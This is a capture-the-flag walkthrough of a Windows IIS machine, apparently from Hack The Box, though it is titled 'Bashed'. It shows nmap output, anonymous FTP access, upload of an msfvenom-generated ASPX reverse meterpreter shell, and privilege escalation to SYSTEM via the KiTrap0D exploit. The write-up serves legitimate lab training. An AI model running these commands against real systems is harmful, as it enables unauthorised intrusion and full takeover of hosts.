# Bashed 

Machine Level: Easy <br />
OS: Windows

## Scanning 
I ran an aggressive nmap scan to find some ports and services running on the machine. 
```
ajread@aj-ubuntu:~/hackthebox$ nmap -A [TARGET IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-08 18:08 EST
Nmap scan report for [TARGET IP]
Host is up (0.013s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
```
## Enumeration
I was able to log into the machine with an anonymous ftp logon. 
```
ajread@aj-ubuntu:~/hackthebox$ ftp [TARGET IP]
Connected to [TARGET IP].
220 Microsoft FTP Service
Name ([TARGET IP]:ajread): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```
It looked as if the ftp server contained the image and htm from the page on port 80. I looked around on the ftp server and I appeared to find the version. 
```
ftp> dir
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          system_web
226 Transfer complete.
ftp> cd system_web
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49161|)
150 Opening ASCII mode data connection.
03-18-17  01:06AM       <DIR>          2_0_50727
226 Transfer complete.
ftp> cd 2_0_50727
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49163|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> 
```
## Initial Access
I created a shell in ASPX using msfvenom using [this](https://github.com/lexisrepo/Shells). 
```
ajread@aj-ubuntu:~/hackthebox/playground$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LOCAL IP]LPORT=4444 -f aspx > shell.aspx
[sudo] password for ajread: 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2848 bytes
```
I put the shell on the server using the anonymous ftp logon. 
```
ftp> ls
229 Entering Extended Passive Mode (|||49164|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> put shell.aspx 
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49165|)
125 Data connection already open; Transfer starting.
100% |*************************************|  2888        9.56 MiB/s    --:-- ETA
226 Transfer complete.
2888 bytes sent in 00:00 (156.60 KiB/s)
ftp> 
```
I started an ```exploit/multi/handler``` with the correct LPORT and LHOST on metasploit and navigated to ```http://[TARGET IP]/shell.aspx```. I was dropped into a meterpreter session on my local machine. 
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on [LOCAL IP]:4444 
[*] Sending stage (175686 bytes) to [TARGET IP]
[*] Meterpreter session 1 opened ([LOCAL IP]:4444 -> [LOCAL IP]:49166) at 2023-02-08 18:27:14 -0500

meterpreter > pwd
c:\windows\system32\inetsrv
meterpreter > 
```
I noticed that I was an unprivileged user, so I backgrounded the session and ran a local windows exploit suggester in metasploit. 
```
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run
```
One of the exploits stood out to me which creates a new session with SYSTEM privileges via the KiTrap0D exploit, which realies on the kitrap0d.x86.dll. 
```
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
```
I ran the exploit and was dropped into a privileged shell! 
```
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on [LOCAL IP]:7777 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2332 launched.
[*] Reflectively injecting the DLL into 2332...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to [TARGET IP]
[*] Meterpreter session 2 opened ([LOCAL IP]:7777 -> [TARGET IP]:49167) at 2023-02-08 18:39:11 -0500

meterpreter > pwd
c:\Users
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
I was able to read both the user and root flags. 
```
c:\Users\babis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\babis\Desktop

11/02/2022  03:54 ��    <DIR>          .
11/02/2022  03:54 ��    <DIR>          ..
09/02/2023  01:00 ��                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.697.468.928 bytes free

c:\Users\babis\Desktop>
```
```
c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\Administrator\Desktop

14/01/2021  11:42 ��    <DIR>          .
14/01/2021  11:42 ��    <DIR>          ..
09/02/2023  01:00 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.697.468.928 bytes free

```